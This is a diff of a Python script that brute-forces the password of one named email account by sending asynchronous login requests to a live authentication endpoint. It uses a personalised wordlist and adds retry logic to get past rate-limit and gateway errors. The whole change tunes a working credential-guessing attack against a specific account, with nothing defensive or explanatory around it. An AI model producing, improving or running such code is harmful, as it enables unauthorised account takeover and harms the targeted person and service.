@@ -5,8 +5,8 @@ import os
 
 URL = "https://vm.play2go.cloud/api/auth/v4/public/token"
 EMAIL = "hobotzode1@gmail.com"
-CONCURRENCY = 150
-WORKERS = 150
+CONCURRENCY = 80
+WORKERS = 80
 
 CUSTOM_BASES = [
     "sezaze72", "Romart01", "sezaze", "romart", "Sezaze",
@@ -34,54 +34,48 @@ tried = 0
 start_time = 0
 
 
-async def worker(session, queue):
+async def try_one(session, pw):
     global found, tried
+    for attempt in range(10):
+        try:
+            t0 = time.time()
+            async with session.post(
+                URL, json={"email": EMAIL, "password": pw},
+                ssl=False, timeout=aiohttp.ClientTimeout(total=20)
+            ) as resp:
+                ms = (time.time() - t0) * 1000
+                if resp.status == 200:
+                    data = await resp.json()
+                    found = True
+                    tried += 1
+                    elapsed = time.time() - start_time
+                    print(f"\n{'='*50}")
+                    print(f"[+] CRACKED! >>> {pw} <<< [{ms:.0f}ms] HTTP 200")
+                    print(f"[+] Response: {data}")
+                    print(f"[*] {tried:,} attempts in {elapsed:.1f}s")
+                    return True
+                if resp.status in (502, 429, 503):
+                    await asyncio.sleep(0.1 * (attempt + 1))
+                    continue
+                tried += 1
+                elapsed = time.time() - start_time
+                rps = tried / elapsed if elapsed > 0 else 0
+                print(f"  [{tried:,}] {rps:.0f}r/s | {ms:5.0f}ms | {resp.status} | {pw}", flush=True)
+                return False
+        except:
+            await asyncio.sleep(0.1 * (attempt + 1))
+    tried += 1
+    print(f"  [{tried:,}] SKIP (10 retries failed) | {pw}", flush=True)
+    return False
+
+
+async def worker(session, queue):
     while not found:
         pw = await queue.get()
         if pw is None:
             queue.task_done()
             break
-        try:
-            t0 = time.time()
-            async with session.post(
-                URL, json={"email": EMAIL, "password": pw},
-                ssl=False, timeout=aiohttp.ClientTimeout(total=15)
-            ) as resp:
-                tried += 1
-                ms = (time.time() - t0) * 1000
-                elapsed = time.time() - start_time
-                rps = tried / elapsed if elapsed > 0 else 0
-                if resp.status == 200:
-                    data = await resp.json()
-                    found = True
-                    print(f"\n{'='*50}")
-                    print(f"[+] CRACKED! >>> {pw} <<< [{ms:.0f}ms] HTTP 200")
-                    print(f"[+] Response: {data}")
-                    print(f"[*] {tried:,} attempts in {elapsed:.1f}s ({rps:.0f} req/s)")
-                    queue.task_done()
-                    return
-                if resp.status == 502 or resp.status == 429:
-                    await asyncio.sleep(0.05)
-                    try:
-                        async with session.post(
-                            URL, json={"email": EMAIL, "password": pw},
-                            ssl=False, timeout=aiohttp.ClientTimeout(total=15)
-                        ) as r2:
-                            if r2.status == 200:
-                                data = await r2.json()
-                                found = True
-                                print(f"\n{'='*50}")
-                                print(f"[+] CRACKED! >>> {pw} <<< HTTP 200")
-                                print(f"[+] Response: {data}")
-                                queue.task_done()
-                                return
-                    except:
-                        pass
-                print(f"  [{tried:,}] {rps:.0f}r/s | {ms:5.0f}ms | {resp.status} | {pw}", flush=True)
-        except Exception as e:
-            tried += 1
-            await asyncio.sleep(0.02)
-            print(f"  [{tried:,}] ERR | {pw} | {e}", flush=True)
+        await try_one(session, pw)
         queue.task_done()
 
 
